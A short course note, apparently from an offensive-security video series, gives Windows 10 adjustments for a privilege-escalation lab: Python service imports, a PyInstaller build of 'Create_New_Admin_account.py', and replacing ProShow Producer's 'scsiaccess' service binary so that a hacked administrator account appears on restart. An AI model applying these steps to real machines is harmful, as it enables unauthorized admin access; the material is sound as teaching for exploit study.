Hello,

The upcoming videos are recorded on windows 7. However the same vulnerable app and code still works on Windows 10 with minor changes.



Notes For Windows 10 users

1-The order of importing libraries matter. servicemanager should be imported after win32X. As following-

import win32serviceutil
import win32service
import win32api
import win32timezone
import win32net
import win32netcon
import servicemanager
## the rest of the code is still the same



2- To export into EXE use-

Pyinstaller --onfile Create_New_Admin_account.py



3- Replace the service file, under

CProgram Files (x86)PhotodexProShow Producer



-Rename the original scsiaccess to scsiaccess123

-Put your Python exe as scsiaccess  (without .exe)

-Restart and test- You should see Hacked account been created
